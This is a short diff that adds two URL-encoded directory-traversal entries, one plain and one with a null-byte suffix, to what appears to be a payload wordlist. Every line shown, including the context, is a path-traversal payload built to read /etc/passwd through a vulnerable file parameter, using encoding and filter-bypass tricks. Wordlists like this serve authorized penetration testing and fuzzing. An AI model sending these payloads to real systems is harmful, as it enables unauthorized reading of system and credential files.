@@ -30,6 +30,7 @@ ___
 /var/www/images/../../../etc/passwd
 /var/www/images/..//..//..//..//etc/passwd
 /var/www/images/....//....//....//....//etc/passwd
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 ..%252f..%252f..%252fetc/passwd
 %2Fetc%2Fpasswd
 %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
@@ -44,6 +45,7 @@ ___
 /var/www/images/../../../etc/passwd%00
 /var/www/images/..//..//..//..//etc/passwd%00
 /var/www/images/....//....//....//....//etc/passwd%00
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00
 ..%252f..%252f..%252fetc/passwd%00
 %2Fetc%2Fpasswd%00
 %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00
